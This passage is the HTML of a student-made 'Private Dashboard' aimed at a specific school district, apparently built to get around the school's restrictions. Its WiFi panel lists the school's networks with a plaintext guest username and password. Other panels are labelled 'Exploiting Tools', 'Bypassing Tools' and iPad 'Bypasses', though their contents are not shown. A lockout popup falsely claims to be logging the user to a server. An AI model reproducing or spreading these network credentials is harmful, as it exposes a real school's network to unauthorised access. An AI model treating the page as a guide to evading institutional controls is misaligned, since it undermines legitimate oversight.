    #themeToggle::before { content: '🎨'; } /* Changed from 🌙/☀️ */
    #logoutBtn::before { content: '👋'; } /* Changed from 🔓 */
    #settingsBtn::before { content: '🛠️'; } /* Dedicated settings icon */


    /* Icons for panel toggle buttons */
    .dashboard-buttons-container button[onclick*='wifiPanel']::before { content: '📶'; } /* Changed from 📡 */
    .dashboard-buttons-container button[onclick*='ipadPanel']::before { content: '📱'; }
    .dashboard-buttons-container button[onclick*='handbookPanel']::before { content: '📚'; } /* Changed from 📘 */
    .dashboard-buttons-container button[onclick*='mapPanel']::before { content: '🗺️'; } /* Changed from 🏫 */
    .dashboard-buttons-container button[onclick*='studentWebsitesPanel']::before { content: '🎓'; } /* Changed from 🌐 */
    .dashboard-buttons-container button[onclick*='teacherWebsitesPanel']::before { content: '🍎'; } /* Changed from 👩‍🏫 */
    .dashboard-buttons-container button[onclick*='phoneDirectoryPanel']::before { content: '☎️'; } /* Changed from 📞 */
    .dashboard-buttons-container button[onclick*='cameraPanel']::before { content: '📹'; } /* Changed from 📷 */
    .dashboard-buttons-container button[onclick*='schoolInfoPanel']::before { content: '🏢'; } /* Changed from 🏫 */
    .dashboard-buttons-container button[onclick*='exploitPanel']::before { content: '💣'; } /* Changed from 🧨 */
    .dashboard-buttons-container button[onclick*='bypassPanel']::before { content: '🔑'; } /* Changed from 🚪 */
    .dashboard-buttons-container button[onclick*='vpnPanel']::before { content: '🛡️'; } /* Changed from 🔐 */
    .dashboard-buttons-container button[onclick*='gamingPanel']::before { content: '🎮'; }
    .dashboard-buttons-container button[onclick*='musicPanel']::before { content: '🎧'; } /* Changed from 🎵 */
    .dashboard-buttons-container button[onclick*='keyboardPanel']::before { content: '⌨️'; } /* Changed from 🎹 */
    .dashboard-buttons-container button[onclick*='calculatorPanel']::before { content: '🧮'; } /* New */
    .dashboard-buttons-container button[onclick*='converterPanel']::before { content: '🔄'; } /* New */
    .dashboard-buttons-container button[onclick*='weatherPanel']::before { content: '☁️'; } /* New */
    .dashboard-buttons-container button[onclick*='todoPanel']::before { content: '✅'; } /* New */
    .dashboard-buttons-container button[onclick*='passwordGeneratorPanel']::before { content: '🔒'; } /* New */
    .dashboard-buttons-container button[onclick*='reminderPanel']::before { content: '⏰'; } /* New */
    .dashboard-buttons-container button[onclick*='aboutPanel']::before { content: '💡'; } /* New About Panel */
    .dashboard-buttons-container button[onclick*='feedbackPanel']::before { content: '💬'; } /* New Feedback Panel */
    .dashboard-buttons-container button[onclick*='statsPanel']::before { content: '📈'; } /* New Stats Panel */
    .dashboard-buttons-container button[onclick*='terminalPanel']::before { content: '📟'; } /* New simulated terminal */
    .dashboard-buttons-container button[onclick*='mediaPanel']::before { content: '📺'; } /* New for general media */

    /* Icons for H2 titles */
    .box h2[id='calendarTitle']::before { content: '🗓️'; }
    .box h2[id='updatesNotificationsTitle']::before { content: '🔔'; }
    .info-panel h2[id='wifiPanelTitle']::before { content: '📶'; }
    .info-panel h2[id='ipadPanelTitle']::before { content: '📱'; }
    .info-panel h2[id='handbookPanelTitle']::before { content: '📚'; }
    .info-panel h2[id='mapPanelTitle']::before { content: '🗺️'; }
    .info-panel h2[id='studentWebsitesPanelTitle']::before { content: '🎓'; }
    .info-panel h2[id='teacherWebsitesPanelTitle']::before { content: '🍎'; }
    .info-panel h2[id='phoneDirectoryPanelTitle']::before { content: '☎️'; }
    .info-panel h2[id='cameraPanelTitle']::before { content: '📹'; }
    .info-panel h2[id='schoolInfoPanelTitle']::before { content: '🏢'; }
    .info-panel h2[id='exploitPanelTitle']::before { content: '💣'; }
    .info-panel h2[id='bypassPanelTitle']::before { content: '🔑'; }
    .info-panel h2[id='vpnPanelTitle']::before { content: '🛡️'; }
    .info-panel h2[id='gamingPanelTitle']::before { content: '🎮'; }
    .info-panel h2[id='musicPanelTitle']::before { content: '🎧'; }
    .info-panel h2[id='keyboardPanelTitle']::before { content: '⌨️'; }
    .info-panel h2[id='settingsPanelTitle']::before { content: '🛠️'; } /* New settings icon */
    .info-panel h2[id='calculatorPanelTitle']::before { content: '🧮'; } /* New */
    .info-panel h2[id='converterPanelTitle']::before { content: '🔄'; } /* New */
    .info-panel h2[id='weatherPanelTitle']::before { content: '☁️'; } /* New */
    .info-panel h2[id='todoPanelTitle']::before { content: '✅'; } /* New */
    .info-panel h2[id='passwordGeneratorPanelTitle']::before { content: '🔒'; } /* New */
    .info-panel h2[id='reminderPanelTitle']::before { content: '⏰'; } /* New */
    .info-panel h2[id='aboutPanelTitle']::before { content: '💡'; } /* New */
    .info-panel h2[id='feedbackPanelTitle']::before { content: '💬'; } /* New */
    .info-panel h2[id='statsPanelTitle']::before { content: '📈'; } /* New */
    .info-panel h2[id='terminalPanelTitle']::before { content: '📟'; } /* New */
    .info-panel h2[id='mediaPanelTitle']::before { content: '📺'; } /* New */

    /* Generic button style for all newly added and existing ones to keep consistency */
    .action-button {
      background-color: var(--accent-color);
      border: none;
      padding: 10px 18px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .action-button:hover {
      background-color: var(--accent-color-light-hover, #ffb67a);
      transform: translateY(-2px);
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
    }
    /* Specific color overrides */
    .action-button.blue { background-color: #007bff; color: white; }
    .action-button.blue:hover { background-color: #0056b3; }
    .action-button.green { background-color: #28a745; color: white; }
    .action-button.green:hover { background-color: #218838; }
    .action-button.red { background-color: #dc3545; color: white; }
    .action-button.red:hover { background-color: #c82333; }
    body.dashboard-body.light-theme .action-button {
        background-color: var(--accent-color-light);
        color: #f9f2dc;
    }
    body.dashboard-body.light-theme .action-button:hover {
        background-color: #7d3d00;
    }

  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

</head>
<body class="login-body" id="bodyElement">

    <!-- Loading Screen 1: Initializing System -->
    <div id="loadingScreen1" class="loading-screen">
        <span id="loadingText1">Initializing System..</span>
    </div>

    <!-- Login System -->
    <div class="login-box" id="loginBox" style="display: none;">
        <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
        <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
        <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
        <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

        <label for="showPassword">
            <input type="checkbox" id="showPassword" />
            <span>Show Password</span>
        </label>

        <button id="submitBtn" class="action-button red">Submit</button>

        <div class="error-message" id="errorMsg"></div>
        <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

        <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
            <p>Too many failed attempts.</p>
            <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
            <button id="resetBtn" class="action-button blue">Reset Counter</button>
        </div>
    </div>

    <!-- Loading Screen 2: Initializing Dashboard -->
    <div id="loadingScreen2" class="loading-screen" style="display: none;">
        <span id="loadingText2">Initializing Dashboard..</span>
    </div>

    <!-- Dashboard (hidden by default) -->
    <div id="dashboard" style="display: none;">
        <div class="dashboard-header" id="dashboardHeader">
            <div>
                <h1>Private Dashboard GUI</h1>
                <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
            </div>
            <div class="version-box">Version 1.6.0</div>
        </div>

        <div class="dashboard-buttons-container">
            <button id="sessionTime">⏳ Session Time: 00:00:00</button>
            <button id="realTimeClock">🕒 --:--:--</button>
            <button id="realDate">📅 --</button>
            <button id="notesBtn">📝 Notes</button>
            <button id="exportNotesBtn">💾 Export Notes</button>
            <button id="screenshotBtn">📸 Screenshot</button>
            <button id="toggleSectionsBtn">↔️ Toggle Sections</button>
            <button id="fixIssuesBtn">⚙️ Fix Issues</button>
            <button id="fullScreenBtn">💻 Full Screen</button>
            <button id="zoomInBtn">➕ Zoom In</button>
            <button id="zoomOutBtn">➖ Zoom Out</button>
            <button id="restartBtn">🔄 Restart</button>
            <button id="panicBtn" class="red">🚨 Panic</button>
            <button id="themeToggle" class="green">🎨 Theme</button>
            <button id="logoutBtn" class="green">👋 Log Out</button>
            <button id="settingsBtn" class="green">🛠️ Settings</button>

            <!-- MORE BUTTONS FOR INFO PANELS -->
            <button class="action-button blue" onclick="dashboard.togglePanel('wifiPanel')">📶 School WiFi Info</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('handbookPanel')">📚 Student Handbooks Info</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('mapPanel')">🗺️ School Building Map Info</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('studentWebsitesPanel')">🎓 Student Websites</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('teacherWebsitesPanel')">🍎 Teacher Websites</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('phoneDirectoryPanel')">☎️ Phone Directory</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('cameraPanel')">📹 School Camera Info</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('schoolInfoPanel')">🏢 School Information</button>
            <button class="action-button red" onclick="dashboard.togglePanel('exploitPanel')">💣 Exploiting Tools</button>
            <button class="action-button red" onclick="dashboard.togglePanel('bypassPanel')">🔑 Bypassing Tools</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('vpnPanel')">🛡️ VPN Websites</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('musicPanel')">🎧 Music Websites</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('keyboardPanel')">⌨️ Keyboard Tricks</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('calculatorPanel')">🧮 Calculator</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('converterPanel')">🔄 Unit Converter</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('weatherPanel')">☁️ Weather</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('todoPanel')">✅ To-Do List</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('passwordGeneratorPanel')">🔒 Password Generator</button>
            <button class="action-button green" onclick="dashboard.togglePanel('reminderPanel')">⏰ Reminders</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('aboutPanel')">💡 About This System</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('feedbackPanel')">💬 Send Feedback</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('statsPanel')">📈 Usage Statistics</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('terminalPanel')">📟 Simulated Terminal</button>
            <button class="action-button blue" onclick="dashboard.togglePanel('mediaPanel')">📺 Media Player</button>

        </div>

        <div id="announcementBar" class="announcement-bar">
            <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨 Don't forget to check the new features: Reminders, Settings, and more tools!</span>
        </div>

        <div class="main-row" id="mainGrid">
            <div class="box">
                <h2 id="calendarTitle">🗓️ Calendar</h2>
                <div class="calendar" id="calendar"></div>
            </div>

            <div class="box motivation-box" id="motivationBox">
                "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
            </div>
        </div>

        <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
            <div class="box" style="flex: 1 1 300px; min-width: 300px;">
                <h2 id="updatesTitle">🔄 Updates</h2>
                <div class="update-entry">Dashboard Interface Update! (Version 1.6.0)</div>
                <div class="update-entry">New Reminder System Added!</div>
                <div class="update-entry">Settings Panel Introduced!</div>
                <div class="update-entry">Multiple New Utilities Deployed</div>
                <div class="update-entry">Enhanced Visuals & Animations</div>
            </div>

            <div class="box" style="flex: 1 1 300px; min-width: 300px;">
                <h2 id="notificationsTitle">🔔 Notifications</h2>
                <p>Welcome to your enhanced Private Dashboard. Explore new features via the buttons below!</p>
            </div>
        </div>

        <!-- Notification container -->
        <div id="notificationContainer" class="notification-container"></div>


        <!-- Information Panels Container -->
        <div id="infoPanelsContainer" style="margin-top: 20px;">
            <!-- Settings Panel -->
            <div id="settingsPanel" class="info-panel">
                <h2 id="settingsPanelTitle">🛠️ Settings</h2>
                <div class="settings-grid">
                    <div class="setting-group">
                        <h3>General</h3>
                        <div class="setting-item">
                            <label for="themeSelector">Theme:</label>
                            <select id="themeSelector">
                                <option value="dark">Dark</option>
                                <option value="light">Light</option>
                            </select>
                        </div>
                        <div class="setting-item">
                            <label for="autoHideNotifications">Auto-hide Notifications:</label>
                            <input type="checkbox" id="autoHideNotifications" checked>
                        </div>
                        <div class="setting-item">
                            <label for="announcementScrollSpeed">Announcement Scroll Speed:</label>
                            <input type="range" id="announcementScrollSpeed" min="5" max="30" value="20">
                            <span id="announcementScrollSpeedValue">20s</span>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Dashboard Display</h3>
                        <div class="setting-item">
                            <label for="dashboardLayout">Layout:</label>
                            <select id="dashboardLayout">
                                <option value="default">Default</option>
                                <option value="compact">Compact</option>
                            </select>
                        </div>
                        <div class="setting-item">
                            <label for="enableMotivationQuote">Motivation Quote:</label>
                            <input type="checkbox" id="enableMotivationQuote" checked>
                        </div>
                        <div class="setting-item">
                            <label for="calendarDisplay">Calendar View:</label>
                            <select id="calendarDisplay">
                                <option value="month">Month</option>
                                <option value="week">Week</option>
                            </select>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Reminders & Notifications</h3>
                        <div class="setting-item">
                            <label for="reminderSound">Reminder Sound:</label>
                            <input type="checkbox" id="reminderSound" checked>
                        </div>
                        <div class="setting-item">
                            <label for="desktopNotifications">Desktop Notifications:</label>
                            <input type="checkbox" id="desktopNotifications">
                        </div>
                        <div class="setting-item">
                            <label for="notificationDuration">Notification Display (seconds):</label>
                            <input type="range" id="notificationDuration" min="2" max="10" value="3">
                            <span id="notificationDurationValue">3s</span>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Customization</h3>
                        <div class="setting-item">
                            <label for="accentColorPicker">Accent Color:</label>
                            <div class="color-picker">
                                <input type="color" id="accentColorPicker" value="#ff914d">
                                <button class="action-button blue small" onclick="dashboard.resetAccentColor()">Reset</button>
                            </div>
                        </div>
                        <div class="setting-item">
                            <label for="mainBgColorPicker">Main Background Color:</label>
                            <div class="color-picker">
                                <input type="color" id="mainBgColorPicker" value="#1a1a1a">
                                <button class="action-button blue small" onclick="dashboard.resetMainBgColor()">Reset</button>
                            </div>
                        </div>
                        <div class="setting-item">
                            <label for="headerBgColorPicker">Header Background:</label>
                            <div class="color-picker">
                                <input type="color" id="headerBgColorPicker" value="#ff914d">
                                <button class="action-button blue small" onclick="dashboard.resetHeaderBgColor()">Reset</button>
                            </div>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Advanced</h3>
                        <div class="setting-item">
                            <label for="enableLogging">Enable Analytics Logging:</label>
                            <input type="checkbox" id="enableLogging" checked>
                        </div>
                        <div class="setting-item">
                            <label for="dataExportBtn">Export User Data:</label>
                            <button id="dataExportBtn" class="action-button blue">Export JSON</button>
                        </div>
                        <div class="setting-item">
                            <label for="clearCacheBtn">Clear Cache:</label>
                            <button id="clearCacheBtn" class="action-button red">Clear</button>
                        </div>
                    </div>

                </div>
            </div>

            <!-- Reminder Panel -->
            <div id="reminderPanel" class="info-panel">
                <h2 id="reminderPanelTitle">⏰ Reminders</h2>
                <div class="reminder-form">
                    <input type="text" id="reminderText" placeholder="Enter reminder text...">
                    <input type="date" id="reminderDate">
                    <input type="time" id="reminderTime">
                    <button id="addReminderBtn" class="action-button green">Add Reminder</button>
                </div>
                <div class="reminder-list-container">
                    <ul id="remindersList">
                        <!-- Reminders will be loaded here -->
                    </ul>
                </div>
                <button id="clearAllRemindersBtn" class="action-button red" style="margin-top: 20px;">Clear All Reminders</button>
            </div>

            <!-- To-Do List Panel -->
            <div id="todoPanel" class="info-panel">
                <h2 id="todoPanelTitle">✅ To-Do List</h2>
                <div class="task-input-group">
                    <input type="text" id="newTaskInput" placeholder="Add a new task...">
                    <button id="addTaskBtn" class="action-button green">Add Task</button>
                </div>
                <ul id="taskList">
                    <!-- Tasks will be loaded here -->
                </ul>
            </div>

            <!-- Calculator Panel -->
            <div id="calculatorPanel" class="info-panel">
                <h2 id="calculatorPanelTitle">🧮 Calculator</h2>
                <div class="calculator-grid">
                    <div class="calculator-output" id="calculatorOutput">0</div>
                    <button class="clear" data-value="clear">AC</button>
                    <button class="operator" data-value="+/-">+/-</button>
                    <button class="operator" data-value="%">%</button>
                    <button class="operator" data-value="/">÷</button>
                    <button data-value="7">7</button>
                    <button data-value="8">8</button>
                    <button data-value="9">9</button>
                    <button class="operator" data-value="*">×</button>
                    <button data-value="4">4</button>
                    <button data-value="5">5</button>
                    <button data-value="6">6</button>
                    <button class="operator" data-value="-">-</button>
                    <button data-value="1">1</button>
                    <button data-value="2">2</button>
                    <button data-value="3">3</button>
                    <button class="operator" data-value="+">+</button>
                    <button data-value="0">0</button>
                    <button data-value=".">.</button>
                    <button class="equals" data-value="=">=</button>
                </div>
            </div>

            <!-- Unit Converter Panel -->
            <div id="converterPanel" class="info-panel">
                <h2 id="converterPanelTitle">🔄 Unit Converter</h2>
                <div class="converter-type-selector">
                    <label for="conversionType">Convert:</label>
                    <select id="conversionType">
                        <option value="length">Length</option>
                        <option value="weight">Weight</option>
                        <option value="temperature">Temperature</option>
                        <option value="volume">Volume</option>
                    </select>
                </div>
                <div class="converter-input-group">
                    <input type="number" id="convertValue" value="1">
                    <select id="convertFromUnit"></select>
                </div>
                <div class="converter-input-group">
                    <label for="convertToUnit">To:</label>
                    <select id="convertToUnit"></select>
                </div>
                <div class="conversion-result">Result: <span id="conversionResult"></span></div>
                <button class="action-button green" id="performConversionBtn" style="width: 100%; margin-top: 15px;">Convert</button>
            </div>

            <!-- Weather Panel -->
            <div id="weatherPanel" class="info-panel">
                <h2 id="weatherPanelTitle">☁️ Weather Information</h2>
                <div class="weather-widget">
                    <input type="text" id="weatherLocationInput" placeholder="Enter city or zip code">
                    <button id="getWeatherBtn" class="action-button blue">Get Weather</button>
                    <div id="weatherInfo" class="weather-info" style="display: none;">
                        <h3>Weather for <span id="weatherCity"></span></h3>
                        <p>Temperature: <span id="weatherTemp"></span></p>
                        <p>Description: <span id="weatherDesc"></span></p>
                        <p>Humidity: <span id="weatherHumidity"></span></p>
                        <p>Wind Speed: <span id="weatherWind"></span></p>
                    </div>
                </div>
            </div>

            <!-- Password Generator Panel -->
            <div id="passwordGeneratorPanel" class="info-panel">
                <h2 id="passwordGeneratorPanelTitle">🔒 Password Generator</h2>
                <div class="password-generator-output" id="generatedPassword">Click "Generate Password"</div>
                <div class="password-controls">
                    <div class="setting-item">
                        <label for="passwordLength">Password Length: <span id="passwordLengthValue">12</span></label>
                        <input type="range" id="passwordLength" min="8" max="64" value="12">
                    </div>
                    <div class="setting-item">
                        <label for="includeUppercase">Include Uppercase:</label>
                        <input type="checkbox" id="includeUppercase" checked>
                    </div>
                    <div class="setting-item">
                        <label for="includeLowercase">Include Lowercase:</label>
                        <input type="checkbox" id="includeLowercase" checked>
                    </div>
                    <div class="setting-item">
                        <label for="includeNumbers">Include Numbers:</label>
                        <input type="checkbox" id="includeNumbers" checked>
                    </div>
                    <div class="setting-item">
                        <label for="includeSymbols">Include Symbols:</label>
                        <input type="checkbox" id="includeSymbols" checked>
                    </div>
                    <button id="generatePasswordBtn" class="action-button green">Generate Password</button>
                    <button id="copyPasswordBtn" class="action-button blue">Copy to Clipboard</button>
                </div>
            </div>

            <!-- About System Panel -->
            <div id="aboutPanel" class="info-panel">
                <h2 id="aboutPanelTitle">💡 About This System</h2>
                <div class="info-text">
                    <p>Welcome to the Private Dashboard GUI (Version 1.6.0). This system is designed to provide quick access to a range of tools and information within a secure and customizable environment.</p>
                    <p>It's built with HTML, CSS, and JavaScript, focusing on user experience, responsiveness, and a modern, themed interface. Key features include a robust login system, session tracking, theme customization, a dynamic calendar, interactive notes, and a wide array of informational and utility panels.</p>
                    <p>We are continuously working on adding new features and improving performance. Thank you for using Private System!</p>
                </div>
            </div>

            <!-- Feedback Panel -->
            <div id="feedbackPanel" class="info-panel">
                <h2 id="feedbackPanelTitle">💬 Send Feedback</h2>
                <div class="info-text">
                    <p>We value your feedback! Please send your suggestions, bug reports, or feature requests to:</p>
                    <p><strong>feedback@privatesystem.org</strong> (This is a placeholder email)</p>
                    <p>Alternatively, you can provide anonymous feedback here (simulated):</p>
                    <textarea id="feedbackTextarea" placeholder="Type your feedback here..." rows="6" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #555; background: #2b2b2b; color: #e0e0e0; margin-top: 10px;"></textarea>
                    <button id="submitFeedbackBtn" class="action-button green" style="width: 100%; margin-top: 15px;">Submit Feedback</button>
                    <p id="feedbackConfirmation" style="margin-top: 10px; color: #28a745; display: none;">Thank you for your feedback!</p>
                </div>
            </div>

            <!-- Usage Statistics Panel -->
            <div id="statsPanel" class="info-panel">
                <h2 id="statsPanelTitle">📈 Usage Statistics</h2>
                <div class="info-text">
                    <p><strong>Dashboard Uptime:</strong> <span id="statsUptime">Loading...</span></p>
                    <p><strong>Buttons Clicked:</strong> <span id="statsClicks">Loading...</span></p>
                    <p><strong>Notes Canvas Used:</strong> <span id="statsCanvasUsed">Loading...</span></p>
                    <p><strong>Themes Toggled:</strong> <span id="statsThemeToggles">Loading...</span></p>
                    <p><strong>Reminders Set:</strong> <span id="statsRemindersSet">Loading...</span></p>
                    <p><strong>Tasks Completed:</strong> <span id="statsTasksCompleted">Loading...</span></p>
                    <p style="margin-top: 15px; font-size: 0.8em; opacity: 0.7;">*Statistics reset upon page reload unless saved via persistent storage.</p>
                </div>
            </div>

            <!-- Simulated Terminal Panel -->
            <div id="terminalPanel" class="info-panel">
                <h2 id="terminalPanelTitle">📟 Simulated Terminal</h2>
                <div class="info-text" style="background-color: #000; color: #0f0; font-family: 'Courier New', monospace; height: 300px; overflow-y: scroll; border: 1px solid #0f0; padding: 10px;">
                    <pre id="terminalOutput">Welcome to Private System Shell (version 1.0)
Type 'help' for commands.

$ </pre>
                </div>
                <input type="text" id="terminalInput" style="width: calc(100% - 22px); padding: 8px; border: 1px solid #0f0; background: #000; color: #0f0; margin-top: 10px; font-family: 'Courier New', monospace;" autocomplete="off" />
            </div>

            <!-- Media Player Panel -->
            <div id="mediaPanel" class="info-panel">
                <h2 id="mediaPanelTitle">📺 Media Player (YouTube Embed)</h2>
                <div class="info-text">
                    <p>Enter a YouTube video ID or full URL:</p>
                    <input type="text" id="youtubeIdInput" placeholder="e.g., dQw4w9WgXcQ or https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="width: 100%; padding: 8px; border-radius: 8px; border: 1px solid #555; background: #2b2b2b; color: #e0e0e0; margin-top: 5px; margin-bottom: 10px;">
                    <button id="loadYoutubeBtn" class="action-button blue" style="width: 100%;">Load Video</button>
                    <div id="youtubePlayer" style="margin-top: 20px; width: 100%; height: 315px; background: #000; display: flex; justify-content: center; align-items: center; color: #eee; font-style: italic;">
                        Video player will load here...
                    </div>
                </div>
            </div>


            <!-- WiFi Panel -->
            <div id="wifiPanel" class="info-panel">
                <h2 id="wifiPanelTitle">📶 School WiFi Information</h2>
                <div class="wifi-grid">
                    <div>Network Name</div>
                    <div>Wifi Level</div>
                    <div>Security Type</div>
                    <div>Encryption</div>
                    <div>Hidden?</div>
                    <div>Monitored?</div>
                    <div>Username</div>
                    <div>Password</div>
                </div>

                <div class="wifi-entry">
                    <div>Middletown_Core</div>
                    <div>High</div>
                    <div>WPA3 Enterprise</div>
                    <div>High</div>
                    <div>No</div>
                    <div>Yes</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                </div>

                <div class="wifi-entry">
                    <div>Mtown_Core</div>
                    <div>High</div>
                    <div>WPA3 Enterprise</div>
                    <div>High</div>
                    <div>Yes</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                </div>

                <div class="wifi-entry">
                    <div>Mtown Guest</div>
                    <div>Medium</div>
                    <div>WPA3 Enterprise</div>
                    <div>Medium</div>
                    <div>No</div>
                    <div>Rare</div>
                    <div>msguest</div>
                    <div>M@ms2021#</div>
                </div>

                <div class="wifi-entry">
                    <div>Radius Test</div>
                    <div>Low</div>
                    <div>WPA3 Enterprise</div>
                    <div>Low</div>
                    <div>No</div>
                    <div>Rarely</div>
                    <div>msguest</div>
                    <div>M@ms2021#</div>
                </div>
            </div>

            <!-- iPad Panel -->
            <div id="ipadPanel" class="info-panel">
                <h2 id="ipadPanelTitle">📱 School iPad Restrictions</h2>
                <div class="ipad-options">
                    <button class="action-button" onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
                    <button class="action-button" onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
                </div>

                <div id="ipadRestrictions" class="ipad-content">
                    <p>Coming soon</p>
                </div>

                <div id="ipadBypasses" class="ipad-content">
                    <p>Coming soon</p>
                </div>
            </div>

            <!-- Handbook Panel -->
            <div id="handbookPanel" class="info-panel">
                <h2 id="handbookPanelTitle">📚 Student Handbooks Information</h2>
                <div class="handbook-buttons">
                    <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" class="action-button blue">Elementary Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" class="action-button blue">Secondary Student Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" class="action-button blue">District Handbook</a>
                    <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" class="action-button blue">RA Academy Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" class="action-button blue">Virtual Learning Plan (2024-2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" class="action-button blue">Dress Code (2024-2025)</a>
                </div>
            </div>

            <!-- Map Panel -->
            <div id="mapPanel" class="info-panel">
                <h2 id="mapPanelTitle">🗺️ School Building Map Information</h2>
                <p>Building Map Display</p>
                <div class="coming-soon">
                    Building Map Coming Soon
                </div>
            </div>

            <!-- Student Websites Panel -->
            <div id="studentWebsitesPanel" class="info-panel">
                <h2 id="studentWebsitesPanelTitle">🎓 Student Website's Information</h2>
                <div class="links-list">
                    <a href="https://www.raiderweb.org" target="_blank" class="action-button">RaiderWeb</a>
                    <a href="https://middletownsd.instructure.com/login" target="_blank" class="action-button">Canvas Login</a>
                    <a href="https://caresolace.com/site/middletownarea" target="_blank" class="action-button">Care Solace</a>
                    <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" class="action-button">Clever Login</a>
                    <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" class="action-button">EasyBridge</a>
                    <a href="https://myhealthyzone.fitnessgram.net" target="_blank" class="action-button">FitnessGram</a>
                    <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" class="action-button">Hazing Reporting</a>
                    <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" class="action-button">MAHS Announcements</a>
                    <a href="https://id.naviance.com" target="_blank" class="action-button">Naviance</a>
                    <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" class="action-button">Destiny Library</a>
                    <a href="https://powerschool.raiderweb.org/public/" target="_blank" class="action-button">PowerSchool</a>
                    <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" class="action-button">Scholastic</a>
                    <a href="https://www.safe2saypa.org" target="_blank" class="action-button">Safe2Say</a>
                    <a href="https://mail.google.com/mail/" target="_blank" class="action-button">Gmail</a>
                    <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" class="action-button">Balfour</a>
                    <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" class="action-button">LinkIt!</a>
                </div>
            </div>

            <!-- Teacher Websites Panel -->
            <div id="teacherWebsitesPanel" class="info-panel">
                <h2 id="teacherWebsitesPanelTitle">🍎 Teacher Websites Information</h2>
                <div class="links-list">
                    <a href="https://alo.acadiencelearning.org/login" target="_blank" class="action-button">Acadience Learning</a>
                    <a href="https://app.aimswebplus.com/#/login" target="_blank" class="action-button">AIMSweb Plus</a>
                    <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" class="action-button">ERP Linq</a>
